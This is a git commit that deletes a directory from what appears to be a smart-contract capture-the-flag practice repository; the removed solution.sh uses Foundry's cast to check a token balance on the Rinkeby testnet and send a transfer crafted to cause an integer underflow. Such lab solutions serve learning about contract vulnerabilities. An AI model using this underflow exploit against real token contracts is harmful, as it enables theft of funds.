3b8c68ed3ec51daba45022eb6b13c7abfdccd263
MouseLess.eth <maximus.holm@gmail.com>
2022-05-03 12:42:30 +0300

    Delete 5_token directory

--- 5_token/solution.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-
-# Finding the current balance of our account
-cast call $TOKEN --rpc-url=$RINKERBY --private-key=$PRIVATE_KEY "balanceOf(address _owner)" 0x527B0642b3902C3Bc29ae13D8208b86dA007aa26
-
-# Sending a transaction to cause an underflow 
-cast send $TOKEN --rpc-url $RINKERBY --private-key $PRIVATE_KEY "transfer(address _to, uint _value)" $TOKEN 21
